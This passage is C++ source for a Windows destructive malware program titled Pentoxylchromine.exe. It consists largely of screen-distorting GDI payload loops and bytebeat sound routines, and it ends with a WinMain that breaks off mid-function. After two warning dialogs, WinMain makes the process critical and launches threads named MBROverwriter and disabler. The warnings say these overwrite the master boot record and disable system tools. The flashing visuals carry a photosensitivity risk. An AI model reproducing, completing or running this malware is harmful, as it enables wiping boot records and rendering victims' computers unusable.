                rgbquad[index].rgbBlue = fx * 64;
            }
        }

        i++; angle += 0.01f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI VenraMBR5(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    int ws = w / 4;
    int hs = h / 4;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = (x - (w / 2));
                int cy = (y - (h / 2));

                //2D Rotating Matrix
                int zx = cos(angle) * cx - sin(angle) * cy;
                int zy = sin(angle) * cx + cos(angle) * cy;

                //XOR Pattern
                int fx = (zx + i) ^ (zy + i);

                rgbquad[index].rgbRed = fx + 32;
                rgbquad[index].rgbGreen = fx + 32;
                rgbquad[index].rgbBlue = fx + 64;
            }
        }

        i++; angle += 0.01f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI UltraDasher965MBR1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    int ws = w;
    int hs = h;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = abs(x - (w / 2));
                int cy = abs(y - (h / 2));

                int zx = cos(angle) * cx - tan(angle) * cy;
                int zy = tan(angle) * cx + cos(angle) * cy;

                int fx = (zx + i) * (zy + i);

                rgbquad[index].rgbRed = fx;
                rgbquad[index].rgbGreen = fx + 32;
                rgbquad[index].rgbBlue = fx + 64;
            }
        }

        i++; angle += 0.01f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;

}

DWORD WINAPI UltraDasher965MBR2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    int ws = w;
    int hs = h;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = abs(x - (w / 2));
                int cy = abs(y - (h / 2));

                int zx = cos(angle) * cx - sin(angle) * cy;
                int zy = sin(angle) * cx + cos(angle) * cy;

                int fx = (zx * i) & (zy * i);

                rgbquad[index].rgbRed = fx;
                rgbquad[index].rgbGreen = fx + 1;
                rgbquad[index].rgbBlue = fx + 2;
            }
        }

        i++; angle += 0.01f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;

}

DWORD WINAPI UltraDasher965MBR3(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    int ws = w;
    int hs = h;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = abs(x - (w / 2));
                int cy = abs(y - (h / 2));

                int zx = cos(angle) * cx - tan(angle) * cy;
                int zy = tan(angle) * cx + cos(angle) * cy;

                int fx = (zx & i) | (zy & i);

                rgbquad[index].rgbRed = fx;
                rgbquad[index].rgbGreen = fx * 1.01;
                rgbquad[index].rgbBlue = fx * 1.02;
            }
        }

        i++; angle += 0.01f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;

}

DWORD WINAPI UltraDasher965MBR4(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    int ws = w;
    int hs = h;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = abs(x - (w / 2));
                int cy = abs(y - (h / 2));

                int zx = cos(angle) * cx - tan(angle) * cy;
                int zy = tan(angle) * cx + cos(angle) * cy;

                int fx = ((zx + i) * (zy + i)) / 1000;

                rgbquad[index].rgbRed = fx;
                rgbquad[index].rgbGreen = fx + 32;
                rgbquad[index].rgbBlue = fx + 64;
            }
        }

        i++; angle += 0.01f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;

}

DWORD WINAPI UltraDasher965MBR5(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    int ws = w;
    int hs = h;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = abs(x - (w / 2));
                int cy = abs(y - (h / 2));

                int zx = cos(angle) * cx - tan(angle) * cy;
                int zy = tan(angle) * cx + cos(angle) * cy;

                int fx = (zx + i) * (zy + i);

                rgbquad[index].rgbRed = fx;
                rgbquad[index].rgbGreen = fx + 32;
                rgbquad[index].rgbBlue = fx + 64;
            }
        }

        i++; angle += 0.01f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;

}

//Sounds
VOID WINAPI bytebeat1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(2500 / ((t % 340) + 1));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 14000, 14000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[14000 * 35] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t) * (((t >> 10 | t >> 8) ^ ((t >> 6) * (t << 2))));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 35] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 2 | t >> 4 | t >> 7 | t >> 9) * (9 * t << 4 | 7 * t << 1 | t | t >> 3 | 6 * t >> 8);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 18500, 18500, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[18500 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 2) >> (15 & (t * 2) >> 6)) ^ ((t * 2) * ((t * 2) & (t * 2) >> 11));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 25] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 5 & t >> 7)) % ((t * 63) + 1);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 13500, 13500, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[13500 * 40] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t) * ((t >> 7) * (t >> 10));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t) * (round(sin(t / 1E4) * 20));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 18000, 18000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[18000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (tan(t / 1E2))) >> (t * (t >> 16));

WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 18000, 18000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[18000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 1 << t)) & (t ^ (t % 255));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (tan(t / 1E7))) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t) * ((t >> 5) ^ (t >> 10));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((tan(t / 1E3)) / ((t >> 6) << (t >> 1)) + 1) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & t >> 12) / (1 + (((t >> 5 | t >> 7 | t >> 10) % (1 + (t << 1 | t >> 2 | t >> 4)))))) * (t * t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 19000, 19000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[19000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t * 2) & t >> 9) % (1 + (((t >> 11 | t >> 6 | t >> 9) % (1 + ((t << 2 | t >> 1 | t >> 13)) + 1)) + 1))) * (sin(t / 20) * 20) - 128;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 26000, 26000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[26000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((sin(t / 40) * 100) - 128) ^ (t >> 8);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat16() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((sin(t / (1 + (t << (t >> 7)) * 10000))) - 128) ^ (t >> 2);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((sin(t / (1 + (t << (t >> 9)))) * 1024) - 128) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeatfinal() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(round(sin(t / 1E0)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (GetFileAttributesW(L"C:\\Windows\\WinNet.exe") == INVALID_FILE_ATTRIBUTES) {
        if (MessageBoxW(NULL, L"The program you have executed is a malware that can severely damage your computer.\n\nThis malware has the capacity of disabling important programs, such as Task Manager, Registry Editor and Command Prompt, overwrite the MBR, and likely make your PC unusable/unfixable. This program also contains a lot of flashing lights and disturbing sounds.\n\nIf you don't know what this does, if you have photosensitive epilepsy or if you are scared of disturbing sounds, press 'No' so that this malicious program won't execute.\n\nOtherwise, if you know what this does and you are running this in a safe environment, you can click on the 'Yes' button to initiate the destruction.\n\nSo, do you want to run this program, making your system unusable/unfixable?", L"Pentoxylchromine.exe", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(NULL, L"Hold up, are you REALLY sure you want to run that?\n\nThe creators (UltraDasher965, TELEPATHII, Number333, Executioner / VenraTech & sixtyfourYT) are not responsible for any damage this malware will cause to your computer.\n\nDo you still want to destroy your computer?\n\nEnsure that all of your data is backed up.", L"Pentoxylchromine.exe - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    }
    ProcessIsCritical();
    Sleep(1000 * 5);
    CreateThread(0, 0, MBROverwriter, 0, 0, 0);
    CreateThread(0, 0, taskbarpoof, 0, 0, 0);
    CreateThread(0, 0, disabler, 0, 0, 0);
    Sleep(1000 * 5);

    bytebeat1();
    HANDLE thread1 = CreateThread(0, 0, Number333_Payload1, 0, 0, 0);
    Sleep(15000);
    HANDLE thread2 = CreateThread(0, 0, TELEPATHII_Payload1, 0, 0, 0);
    Sleep(15000);
    TerminateThread(thread1, 0);
    CloseHandle(thread1);
    TerminateThread(thread2, 0);
    CloseHandle(thread2);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread3 = CreateThread(0, 0, TELEPATHII_Payload2, 0, 0, 0);
    bytebeat2();
    Sleep(35000);
    TerminateThread(thread3, 0);
    CloseHandle(thread3);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    bytebeat3();
    HANDLE thread4 = CreateThread(0, 0, UltraDasher965_Payload1, 0, 0, 0);
    Sleep(20000);
    HANDLE thread5 = CreateThread(0, 0, VenraTech_Payload1, 0, 0, 0);
    Sleep(15000);
    TerminateThread(thread4, 0);
    CloseHandle(thread4);
    TerminateThread(thread5, 0);
    CloseHandle(thread5);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread6 = CreateThread(0, 0, sixtyfourYT_Payload1, 0, 0, 0);
    bytebeat4();
    Sleep(30000);
    TerminateThread(thread6, 0);
    CloseHandle(thread6);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread7 = CreateThread(0, 0, Number333_Payload2, 0, 0, 0);
    bytebeat5();
    Sleep(25000);
    TerminateThread(thread7, 0);
    CloseHandle(thread7);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    bytebeat6();
    HANDLE thread8 = CreateThread(0, 0, UltraDasher965_Payload2, 0, 0, 0);
    Sleep(20000);
    HANDLE thread9 = CreateThread(0, 0, UltraDasher965_Payload3, 0, 0, 0);
    Sleep(20000);
    TerminateThread(thread8, 0);
    CloseHandle(thread8);
    TerminateThread(thread9, 0);
    CloseHandle(thread9);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread10 = CreateThread(0, 0, VenraTech_Payload2, 0, 0, 0);
    bytebeat7();
    Sleep(30000);
    TerminateThread(thread10, 0);
    CloseHandle(thread10);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread11 = CreateThread(0, 0, sixtyfourYT_Payload2, 0, 0, 0);
    bytebeat8();
    Sleep(30000);
    TerminateThread(thread11, 0);
    CloseHandle(thread11);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread12 = CreateThread(0, 0, VenraTech_Payload3, 0, 0, 0);
    HANDLE messagebox = CreateThread(0, 0, RMSGBX, 0, 0, 0);
    bytebeat9();
    Sleep(30000);
    TerminateThread(thread12, 0);
    CloseHandle(thread12);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread13 = CreateThread(0, 0, TELEPATHII_Payload3, 0, 0, 0);
    HANDLE thread13dot1 = CreateThread(0, 0, textouts, 0, 0, 0);
    bytebeat10();
    Sleep(30000);
    TerminateThread(thread13, 0);
    CloseHandle(thread13);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

